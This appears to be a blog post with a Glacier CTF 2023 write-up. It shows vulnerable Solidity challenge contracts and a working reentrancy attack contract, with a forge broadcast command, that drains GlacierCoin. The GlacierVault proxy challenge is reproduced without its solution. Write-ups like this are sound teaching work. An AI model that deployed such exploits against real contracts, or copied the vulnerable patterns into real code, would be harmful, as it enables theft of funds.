<!doctype html><html lang=en><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><title>
         Glacier CTF 2023
        
    </title><meta content="Glacier CTF 2023" property=og:title><link href=/favicons/favicon.ico rel=icon type=image/png><link href=https://themj0ln1r.github.io/fonts.css rel=stylesheet><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel=stylesheet><script async data-goatcounter=https://themj0ln1r.goatcounter.com/count src=https://themj0ln1r.github.io/js/count.js></script><noscript><img src="https://themj0ln1r.goatcounter.com//count?p=/archive/glacierctf23/&t=Glacier CTF 2023"></noscript><script src=https://themj0ln1r.github.io/js/codeblock.js></script><script src=https://themj0ln1r.github.io/js/toc.js></script><script src=https://themj0ln1r.github.io/js/note.js></script><script>MathJax = {
              tex: {
                inlineMath: [['$', '$'], ['\\(', '\\)']]
              }
            };</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><link title="TheMj0ln1r Blog" href=https://themj0ln1r.github.io/atom.xml rel=alternate type=application/atom+xml><link href=https://themj0ln1r.github.io/theme/light.css rel=stylesheet><link href=https://themj0ln1r.github.io/theme/dark.css id=darkModeStyle rel=stylesheet><script src=https://themj0ln1r.github.io/js/themetoggle.js></script><script>setTheme(getSavedTheme());</script><link href=https://themj0ln1r.github.io/main.css media=screen rel=stylesheet><body><div class=content><header><div class=main><a href=https://themj0ln1r.github.io/><b>TheMj0ln1r Blog</b></a><div class=socials></div></div><nav><a href=https://themj0ln1r.github.io/cv style=margin-left:.5em><b>CV</b></a><a href=https://themj0ln1r.github.io/archive style=margin-left:.5em><b>Archive</b></a><a href=https://themj0ln1r.github.io/tags style=margin-left:.5em><b>Tags</b></a> |<a onclick="toggleTheme(); event.preventDefault();" href=# id=dark-mode-toggle> <img alt=Light id=sun-icon src=https://themj0ln1r.github.io/feather/sun.svg style=filter:invert()> <img alt=Dark id=moon-icon src=https://themj0ln1r.github.io/feather/moon.svg> </a><script>updateItemToggleTheme()</script></nav></header><main><article><div class=title><div class=page-header>Glacier CTF 2023</div><div class=meta>Posted on <time>2023-11-27</time><span class=tags-label> :: Tags:</span><span class=tags> <a class=post-tag href=https://themj0ln1r.github.io/tags/ctf/>ctf</a>, <a class=post-tag href=https://themj0ln1r.github.io/tags/blockchain/>blockchain</a> </span></div></div><div class=toc-container><h5 class=toc-title>Table of Contents</h5><ul class=toc-list><li><a href=https://themj0ln1r.github.io/archive/glacierctf23/#smart-contracts>Smart Contracts</a> <ul><li><a href=https://themj0ln1r.github.io/archive/glacierctf23/#glaciercoin-68pts>GlacierCoin [68pts]</a><li><a href=https://themj0ln1r.github.io/archive/glacierctf23/#glaciervault-316pts>GlacierVault [316pts]</a><li><a href=https://themj0ln1r.github.io/archive/glacierctf23/#chairlift-397pts>ChairLift [397pts]</a><li><a href=https://themj0ln1r.github.io/archive/glacierctf23/#the-concil-of-apes-456pts>The Concil of Apes [456pts]</a></ul></ul></div><section class=body><p>Hey hi, I played <a href=https://ctftime.org/event/1992 target=_blank>Glacier CTF 2023</a>. I joined with <a href=https://ctftime.org/team/116280 target=_blank>CyberSpace</a> a wonderful team to work with. We got <strong><code>14th</code></strong> place in this CTF. I am focused on my fav smart contract challenges and solved ALL of them. Let me share those ATTACK scripts here.<h1 id=smart-contracts>Smart Contracts</h1><img class=autoimg src=/assets/img/ctf_img/glacier23/glacierctf23_progress.png><p>Clone my solution repository to follow along<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>git clone https://github.com/TheMj0ln1r/GlacierCTF23Solves.git
</span></code></pre><h2 id=glaciercoin-68pts>GlacierCoin [68pts]</h2><pre style=color:#323232;background-color:#fff><code><span>Description :
</span><span>
</span><span>"You start your journey up the glacier, to get to new heights (maybe even the moon). To get up the first part of the glacie you will need a guide to help you. The cheapest guide that you find charges you 1000 glacier coins, but unfortunately you only have 10. Find a way to pay the guide. To get the ticket, run solve-pow.py"
</span><span>
</span><span>author: J4X
</span><span>
</span><span>nc chall.glacierctf.com 13372
</span><span>
</span><span>Attached Files : [Challenge.sol, Setup.sol, solve-pow.py]
</span></code></pre><blockquote><p>Note : solve-pow.py is just a pow script which generates a ticket for solver which used to deploy our challenge instance using <code>nc chall.glacierctf.com 13372</code></blockquote><p><code>Setup.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span>
</span><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"./Challenge.sol"</span><span>;
</span><span>
</span><span>contract Setup {
</span><span>    GlacierCoin public immutable </span><span style=color:#0086b3>TARGET</span><span>; </span><span style=color:#969896;font-style:italic>// Contract the player will hack
</span><span>
</span><span>    </span><span style=color:#795da3;font-weight:700>constructor</span><span>() payable {
</span><span>        </span><span style=color:#62a35c>require</span><span>(msg.value </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>100 </span><span>ether);
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Deploy the victim contract
</span><span>        </span><span style=color:#0086b3>TARGET </span><span style=color:#a71d5d;font-weight:700>= new </span><span>GlacierCoin();
</span><span>
</span><span>        </span><span style=color:#969896;font-style:italic>// Send 10 ether to the victim contract as initial balance
</span><span>        </span><span style=color:#0086b3>TARGET</span><span>.buy{value: </span><span style=color:#0086b3>10 </span><span>ether}();
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// Our challenge in the CTF framework will call this function to
</span><span>    </span><span style=color:#969896;font-style:italic>// check whether the player has solved the challenge or not.
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>isSolved</span><span>() </span><span style=color:#795da3;font-weight:700>public view returns </span><span>(bool) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#795da3;font-weight:700>address</span><span>(</span><span style=color:#0086b3>TARGET</span><span>).balance </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>0</span><span>;
</span><span>    }
</span><span>}
</span></code></pre><p><code>Challenge.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span>
</span><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>18</span><span>;
</span><span>
</span><span>contract GlacierCoin
</span><span>{
</span><span>    address owner;
</span><span>    </span><span style=color:#795da3;font-weight:700>mapping</span><span>(address </span><span style=color:#a71d5d;font-weight:700>=> </span><span>uint) public balances;
</span><span>    </span><span style=color:#795da3;font-weight:700>mapping</span><span>(address </span><span style=color:#a71d5d;font-weight:700>=> </span><span>uint) public frozen;
</span><span>    </span><span style=color:#795da3;font-weight:700>constructor</span><span>() 
</span><span>    {
</span><span>        owner </span><span style=color:#a71d5d;font-weight:700>= </span><span>msg.sender;
</span><span>    }
</span><span>    </span><span style=color:#969896;font-style:italic>//This is the function you need to call to buy tokens
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>buy</span><span>() </span><span style=color:#795da3;font-weight:700>public payable
</span><span>    {
</span><span>        </span><span style=color:#795da3;font-weight:700>_mint</span><span>(msg.value, msg.sender);
</span><span>    }
</span><span>    </span><span style=color:#969896;font-style:italic>//This is the function you need to call to burn tokens
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>burn</span><span>(uint256 amount) </span><span style=color:#795da3;font-weight:700>public
</span><span>    {
</span><span>        </span><span style=color:#62a35c>require</span><span>(balances[msg.sender] </span><span style=color:#a71d5d;font-weight:700>>= </span><span>amount, </span><span style=color:#183691>"You can not burn this much as you are poor af"</span><span>);
</span><span>        balances[msg.sender] </span><span style=color:#a71d5d;font-weight:700>-= </span><span>amount;
</span><span>    }
</span><span>    </span><span style=color:#969896;font-style:italic>//This is a even cooler contract than ERC20 you can not only burn, but also freeze your token. 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>freeze</span><span>(uint256 amount) </span><span style=color:#795da3;font-weight:700>public
</span><span>    {
</span><span>        </span><span style=color:#62a35c>require</span><span>(balances[msg.sender] </span><span style=color:#a71d5d;font-weight:700>>= </span><span>amount, </span><span style=color:#183691>"You can not freeze this much as you are poor af"</span><span>);
</span><span>        frozen[msg.sender] </span><span style=color:#a71d5d;font-weight:700>+= </span><span>amount;
</span><span>        balances[msg.sender] </span><span style=color:#a71d5d;font-weight:700>-= </span><span>amount;
</span><span>    }
</span><span>    </span><span style=color:#969896;font-style:italic>//You can even unfreeze your token, but you can only unfreeze as much as you have frozen
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>defrost</span><span>(uint256 amount) </span><span style=color:#795da3;font-weight:700>public
</span><span>    {
</span><span>        </span><span style=color:#62a35c>require</span><span>(frozen[msg.sender] </span><span style=color:#a71d5d;font-weight:700>>= </span><span>amount, </span><span style=color:#183691>"You can not unfreeze this much"</span><span>);
</span><span>        frozen[msg.sender] </span><span style=color:#a71d5d;font-weight:700>-= </span><span>amount;
</span><span>        balances[msg.sender] </span><span style=color:#a71d5d;font-weight:700>+= </span><span>amount;
</span><span>    }
</span><span>    </span><span style=color:#969896;font-style:italic>//You can even sell your token for ether, but you can only sell as much as you have
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>sell</span><span>(uint256 amount) </span><span style=color:#795da3;font-weight:700>public
</span><span>    {
</span><span>        </span><span style=color:#62a35c>require</span><span>(balances[msg.sender] </span><span style=color:#a71d5d;font-weight:700>>= </span><span>amount, </span><span style=color:#183691>"You can not sell this much as you are poor af"</span><span>);
</span><span>        uint256 new_balance </span><span style=color:#a71d5d;font-weight:700>= </span><span>balances[msg.sender] </span><span style=color:#a71d5d;font-weight:700>- </span><span>amount;
</span><span>        (msg.sender).call{value: amount}(</span><span style=color:#183691>""</span><span>);
</span><span>        balances[msg.sender] </span><span style=color:#a71d5d;font-weight:700>= </span><span>new_balance;
</span><span>    }
</span><span>    </span><span style=color:#969896;font-style:italic>//Internal functions (These shouldn't interest you)
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_mint</span><span>(uint256 amount, address target) </span><span style=color:#795da3;font-weight:700>internal
</span><span>    {
</span><span>        balances[target] </span><span style=color:#a71d5d;font-weight:700>+= </span><span>amount;
</span><span>    }   
</span><span>}
</span><span>
</span></code></pre><p>Observations :<ol><li>We are given with setup contract address<li>Setup contract deployes the GlacierCoin contract and funds with 10 ether<li>GlacierCoin is a non-standard token contracts with buy, sell, freeze features</ol><p>Goal :<ul><li>The goal is to make the GlacierCoin balance 0 (look at isSolved() in Setup)</ul><p>We can simply look at the <code>sell()</code> function which is susceptable to the great <code>Reentrancy</code>. The balance of the sender updated after the external call. So, we can simply write an Attack contract with a fallback function <code>Reenter</code> into the <code>sell()</code> function.<p>Attack :<ol><li>Buy 10 coins in GlacierCoin with 10 ether<li>Sell it back<li>Reenter into sell again from fallback</ol><p><code>Attack.s.sol</code> :<pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>18</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{Setup} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"../src/GlacierCoin/Setup.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{GlacierCoin} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"../src/GlacierCoin/Challenge.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{Script} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"forge-std/Script.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span>{console} </span><span style=color:#a71d5d;font-weight:700>from </span><span style=color:#183691>"forge-std/console.sol"</span><span>;
</span><span>
</span><span>contract AttackScript is Script{
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>run</span><span>() </span><span style=color:#795da3;font-weight:700>public</span><span>{
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>startBroadcast</span><span>();
</span><span>        </span><span style=color:#a71d5d;font-weight:700>new </span><span>Attack{value</span><span style=color:#a71d5d;font-weight:700>: </span><span style=color:#0086b3>20 </span><span>ether}().</span><span style=color:#795da3;font-weight:700>exploit</span><span>();
</span><span>        </span><span style=color:#0086b3>console</span><span>.</span><span style=color:#62a35c>log</span><span>(</span><span style=color:#183691>"Attack Success"</span><span>);
</span><span>        vm.</span><span style=color:#795da3;font-weight:700>stopBroadcast</span><span>();
</span><span>    }
</span><span>}
</span><span>
</span><span>contract Attack{
</span><span>    Setup public setupContract </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>Setup</span><span>(</span><span style=color:#0086b3>0x1163C62DE50f6f148e3deA99cA65EBAff3fab967</span><span>);
</span><span>    GlacierCoin public </span><span style=color:#0086b3>TARGET </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#795da3;font-weight:700>GlacierCoin</span><span>(</span><span style=color:#795da3;font-weight:700>address</span><span>(setupContract.</span><span style=color:#795da3;font-weight:700>TARGET</span><span>()));
</span><span>    </span><span style=color:#795da3;font-weight:700>constructor</span><span>() payable {
</span><span>        </span><span style=color:#62a35c>require</span><span>(msg.value </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>20 </span><span>ether); </span><span style=color:#969896;font-style:italic>// For attack contract usage
</span><span>    }
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>exploit</span><span>() </span><span style=color:#795da3;font-weight:700>public</span><span>{
</span><span>        </span><span style=color:#0086b3>TARGET</span><span>.buy{value: </span><span style=color:#0086b3>10 </span><span>ether}();
</span><span>        </span><span style=color:#0086b3>TARGET</span><span>.</span><span style=color:#795da3;font-weight:700>sell</span><span>(</span><span style=color:#0086b3>10 </span><span>ether);
</span><span>    }
</span><span>    </span><span style=color:#795da3;font-weight:700>fallback</span><span>() external payable { 
</span><span>        </span><span style=color:#0086b3>TARGET</span><span>.</span><span style=color:#795da3;font-weight:700>sell</span><span>(</span><span style=color:#0086b3>10 </span><span>ether);    
</span><span>    }
</span><span>}
</span><span>
</span></code></pre><p>Run the following command to solve the challenge.<pre class=language-bash data-lang=bash style=color:#323232;background-color:#fff><code class=language-bash data-lang=bash><span>forge script script/GlacierCoinAttack.s.sol:AttackScript --rpc-url </span><span style=color:#a71d5d;font-weight:700>&lt;</span><span>RPC-URL</span><span style=color:#a71d5d;font-weight:700>> </span><span>--private-key </span><span style=color:#a71d5d;font-weight:700>&lt;</span><span>REDACTED</span><span style=color:#a71d5d;font-weight:700>> </span><span>--broadcast
</span></code></pre><h2 id=glaciervault-316pts>GlacierVault [316pts]</h2><pre style=color:#323232;background-color:#fff><code><span>Description :
</span><span>
</span><span>"Ascending the glacier under the guidance of your seasoned expedition leader, you encounter a breathtaking sight: a vault intricately carved into the ice, its entrance guarded by a formidable sentinel. This ancient guardian stands watch, an imposing figure resolute in its duty. To gain access to the enigmatic vault and its concealed treasures, you must devise a clever strategy to lull the guardian into a deep, peaceful slumber, a challenge that awaits your resourcefulness and cunning. To get the ticket, run solve-pow.py"
</span><span>
</span><span>author: J4X
</span><span>
</span><span>nc chall.glacierctf.com 13377
</span><span>
</span><span>Attached Files : [GlacierVault.sol, Guardian.sol, Setup.sol]
</span></code></pre><p><code>Setup.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>0</span><span>;
</span><span>
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"./GlacierVault.sol"</span><span>;
</span><span style=color:#a71d5d;font-weight:700>import </span><span style=color:#183691>"./Guardian.sol"</span><span>;
</span><span>
</span><span>contract Setup {
</span><span>    Guardian public immutable </span><span style=color:#0086b3>TARGET</span><span>; </span><span style=color:#969896;font-style:italic>// Contract the player will hack
</span><span>    </span><span style=color:#795da3;font-weight:700>constructor</span><span>() payable {
</span><span>        </span><span style=color:#969896;font-style:italic>// Deploy the victim contract
</span><span>        GlacierVault vault </span><span style=color:#a71d5d;font-weight:700>= new </span><span>GlacierVault();
</span><span>        </span><span style=color:#969896;font-style:italic>// Deploy the guardian contract
</span><span>        </span><span style=color:#0086b3>TARGET </span><span style=color:#a71d5d;font-weight:700>= new </span><span>Guardian(</span><span style=color:#795da3;font-weight:700>address</span><span>(vault));
</span><span>    }
</span><span>    </span><span style=color:#969896;font-style:italic>// Our challenge in the CTF framework will call this function to
</span><span>    </span><span style=color:#969896;font-style:italic>// check whether the player has solved the challenge or not.
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>isSolved</span><span>() </span><span style=color:#795da3;font-weight:700>public view returns </span><span>(bool) {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span style=color:#0086b3>TARGET</span><span>.</span><span style=color:#795da3;font-weight:700>asleep</span><span>();
</span><span>    }
</span><span>}
</span></code></pre><p><code>Guardian.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>18</span><span>;
</span><span>
</span><span>contract Guardian
</span><span>{
</span><span>    bool public asleep;
</span><span>    address public implementation_addr;
</span><span>    uint256 people_mauled;
</span><span>    address public owner;
</span><span>
</span><span>    event </span><span style=color:#795da3;font-weight:700>putToSleepCall</span><span>(address, address);
</span><span>
</span><span>    </span><span style=color:#795da3;font-weight:700>constructor</span><span>(address _implementation_addr)
</span><span>    {
</span><span>        asleep </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>false</span><span>;
</span><span>        implementation_addr </span><span style=color:#a71d5d;font-weight:700>= </span><span>_implementation_addr;
</span><span>        owner </span><span style=color:#a71d5d;font-weight:700>= </span><span>msg.sender;
</span><span>        people_mauled </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>0</span><span>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>putToSleep</span><span>() </span><span style=color:#795da3;font-weight:700>external
</span><span>    {
</span><span>        emit </span><span style=color:#795da3;font-weight:700>putToSleepCall</span><span>(msg.sender, owner);
</span><span>        </span><span style=color:#62a35c>require</span><span>(msg.sender </span><span style=color:#a71d5d;font-weight:700>== </span><span>owner, </span><span style=color:#183691>"You can't do that. The yeti mauls you."</span><span>);
</span><span>        asleep </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>true</span><span>;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>punch</span><span>() </span><span style=color:#795da3;font-weight:700>external payable
</span><span>    {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if </span><span>(msg.value </span><span style=color:#a71d5d;font-weight:700>> </span><span style=color:#0086b3>10_000_000 </span><span>ether)
</span><span>        {
</span><span>            asleep </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#0086b3>true</span><span>;
</span><span>        }
</span><span>        </span><span style=color:#a71d5d;font-weight:700>else
</span><span>        {
</span><span>            people_mauled </span><span style=color:#a71d5d;font-weight:700>+= </span><span style=color:#0086b3>1</span><span>;
</span><span>        }
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_delegate</span><span>(address implementation) </span><span style=color:#795da3;font-weight:700>internal </span><span>{
</span><span>        assembly {
</span><span>            </span><span style=color:#969896;font-style:italic>// Copy msg.data. We take full control of memory in this inline assembly
</span><span>            </span><span style=color:#969896;font-style:italic>// block because it will not return to Solidity code. We overwrite the
</span><span>            </span><span style=color:#969896;font-style:italic>// Solidity scratch pad at memory position 0.
</span><span>            </span><span style=color:#795da3;font-weight:700>calldatacopy</span><span>(</span><span style=color:#0086b3>0</span><span>, </span><span style=color:#0086b3>0</span><span>, </span><span style=color:#795da3;font-weight:700>calldatasize</span><span>())
</span><span>
</span><span>            </span><span style=color:#969896;font-style:italic>// Call the implementation.
</span><span>            </span><span style=color:#969896;font-style:italic>// out and outsize are 0 because we don't know the size yet.
</span><span>            </span><span style=color:#a71d5d;font-weight:700>let </span><span>result </span><span style=color:#a71d5d;font-weight:700>:</span><span>= delegatecall(gas(), implementation, </span><span style=color:#0086b3>0</span><span>, calldatasize(), </span><span style=color:#0086b3>0</span><span>, </span><span style=color:#0086b3>0</span><span>)
</span><span>
</span><span>            </span><span style=color:#969896;font-style:italic>// Copy the returned data.
</span><span>            </span><span style=color:#795da3;font-weight:700>returndatacopy</span><span>(</span><span style=color:#0086b3>0</span><span>, </span><span style=color:#0086b3>0</span><span>, </span><span style=color:#795da3;font-weight:700>returndatasize</span><span>())
</span><span>
</span><span>            </span><span style=color:#a71d5d;font-weight:700>switch </span><span>result
</span><span>            </span><span style=color:#969896;font-style:italic>// delegatecall returns 0 on error.
</span><span>            </span><span style=color:#a71d5d;font-weight:700>case </span><span style=color:#0086b3>0 </span><span>{
</span><span>                </span><span style=color:#795da3;font-weight:700>revert</span><span>(</span><span style=color:#0086b3>0</span><span>, </span><span style=color:#795da3;font-weight:700>returndatasize</span><span>())
</span><span>            }
</span><span>            </span><span style=color:#a71d5d;font-weight:700>default </span><span>{
</span><span>                </span><span style=color:#a71d5d;font-weight:700>return</span><span>(</span><span style=color:#0086b3>0</span><span>, </span><span style=color:#795da3;font-weight:700>returndatasize</span><span>())
</span><span>            }
</span><span>        }
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>/**
</span><span style=color:#969896;font-style:italic>     * </span><span style=color:#a71d5d;font-weight:700>@dev</span><span style=color:#969896;font-style:italic> This is a virtual function that should be overridden so it returns the address to which the fallback function
</span><span style=color:#969896;font-style:italic>     * and {_fallback} should delegate.
</span><span style=color:#969896;font-style:italic>     */
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_implementation</span><span>() </span><span style=color:#795da3;font-weight:700>internal view returns </span><span>(address)
</span><span>    {
</span><span>        </span><span style=color:#a71d5d;font-weight:700>return </span><span>implementation_addr;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>/**
</span><span style=color:#969896;font-style:italic>     * </span><span style=color:#a71d5d;font-weight:700>@dev</span><span style=color:#969896;font-style:italic> Delegates the current call to the address returned by `_implementation()`.
</span><span style=color:#969896;font-style:italic>     *
</span><span style=color:#969896;font-style:italic>     * This function does not return to its internal call site, it will return directly to the external caller.
</span><span style=color:#969896;font-style:italic>     */
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_fallback</span><span>() </span><span style=color:#795da3;font-weight:700>internal </span><span>{
</span><span>        </span><span style=color:#795da3;font-weight:700>_beforeFallback</span><span>();
</span><span>        </span><span style=color:#795da3;font-weight:700>_delegate</span><span>(</span><span style=color:#795da3;font-weight:700>_implementation</span><span>());
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>/**
</span><span style=color:#969896;font-style:italic>     * </span><span style=color:#a71d5d;font-weight:700>@dev</span><span style=color:#969896;font-style:italic> Fallback function that delegates calls to the address returned by `_implementation()`. Will run if no other
</span><span style=color:#969896;font-style:italic>     * function in the contract matches the call data.
</span><span style=color:#969896;font-style:italic>     */
</span><span>    </span><span style=color:#795da3;font-weight:700>fallback</span><span>() external payable {
</span><span>        </span><span style=color:#795da3;font-weight:700>_fallback</span><span>();
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>/**
</span><span style=color:#969896;font-style:italic>     * </span><span style=color:#a71d5d;font-weight:700>@dev</span><span style=color:#969896;font-style:italic> Hook that is called before falling back to the implementation. Can happen as part of a manual `_fallback`
</span><span style=color:#969896;font-style:italic>     * call, or as part of the Solidity `fallback` or `receive` functions.
</span><span style=color:#969896;font-style:italic>     *
</span><span style=color:#969896;font-style:italic>     * If overridden should call `super._beforeFallback()`.
</span><span style=color:#969896;font-style:italic>     */
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>_beforeFallback</span><span>() </span><span style=color:#795da3;font-weight:700>internal </span><span>{}
</span><span>}
</span></code></pre><p><code>GlacierVault.sol</code><pre class=language-javascript data-lang=javascript style=color:#323232;background-color:#fff><code class=language-javascript data-lang=javascript><span style=color:#969896;font-style:italic>// SPDX-License-Identifier: MIT
</span><span>pragma solidity </span><span style=color:#a71d5d;font-weight:700>^</span><span style=color:#0086b3>0.8</span><span>.</span><span style=color:#0086b3>18</span><span>;
</span><span>
</span><span>contract GlacierVault
</span><span>{
</span><span>    </span><span style=color:#795da3;font-weight:700>mapping</span><span>(uint256 </span><span style=color:#a71d5d;font-weight:700>=> </span><span>address) slot_owners;
</span><span>    </span><span style=color:#795da3;font-weight:700>mapping</span><span>(uint256 </span><span style=color:#a71d5d;font-weight:700>=> </span><span>string) private slots;
</span><span>    uint256 quickstore1;
</span><span>    uint256 quickstore2;
</span><span>    uint256 quickstore3;
</span><span>    uint256 quickstore4;
</span><span>    uint256 quickstore5;
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>// You can use this vault to store your strings forever 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>store</span><span>(string memory item, uint256 slot_index) </span><span style=color:#795da3;font-weight:700>payable public
</span><span>    {
</span><span>        </span><span style=color:#62a35c>require</span><span>(msg.value </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>1337</span><span>);
</span><span>        </span><span style=color:#62a35c>require</span><span>(slot_owners[slot_index] </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#795da3;font-weight:700>address</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#a71d5d;font-weight:700>|| </span><span>slot_owners[slot_index] </span><span style=color:#a71d5d;font-weight:700>== </span><span>msg.sender, </span><span style=color:#183691>"this store is already used by someone else"</span><span>);
</span><span>
</span><span>        slots[slot_index] </span><span style=color:#a71d5d;font-weight:700>= </span><span>item;
</span><span>        slot_owners[slot_index] </span><span style=color:#a71d5d;font-weight:700>= </span><span>msg.sender;
</span><span>    }
</span><span>
</span><span>    </span><span style=color:#969896;font-style:italic>//These are just for quickly storing numbers (like if you want to write down a phone number and don't forget it)
</span><span>    </span><span style=color:#a71d5d;font-weight:700>function </span><span style=color:#795da3;font-weight:700>quickStore</span><span>(uint8 index, uint256 value) </span><span style=color:#795da3;font-weight:700>public payable
</span><span>    {
</span><span>        </span><span style=color:#62a35c>require</span><span>(msg.value </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>1337</span><span>);
</span><span>        </span><span style=color:#a71d5d;font-weight:700>if</span><span>(index </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>0</span><span>)
</span><span>        {
</span><span>            quickstore1 </span><span style=color:#a71d5d;font-weight:700>= </span><span>value;
</span><span>        }
</span><span>        </span><span style=color:#a71d5d;font-weight:700>else if </span><span>(index </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>1</span><span>)
</span><span>        {
</span><span>            quickstore2 </span><span style=color:#a71d5d;font-weight:700>= </span><span>value;
</span><span>        }
</span><span>        </span><span style=color:#a71d5d;font-weight:700>else if </span><span>(index </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>2</span><span>)
</span><span>        {
</span><span>            quickstore3 </span><span style=color:#a71d5d;font-weight:700>= </span><span>value;
</span><span>        }
</span><span>        </span><span style=color:#a71d5d;font-weight:700>else if </span><span>(index </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>3</span><span>)
</span><span>        {
</span><span>            quickstore4 </span><span style=color:#a71d5d;font-weight:700>= </span><span>value;
</span><span>        }
</span><span>        </span><span style=color:#a71d5d;font-weight:700>else if </span><span>(index </span><span style=color:#a71d5d;font-weight:700>== </span><span style=color:#0086b3>4</span><span>)
</span><span>        {
</span><span>            quickstore5 </span><span style=color:#a71d5d;font-weight:700>= </span><span>value;
</span><span>        }
</span><span>    }
</span><span>}
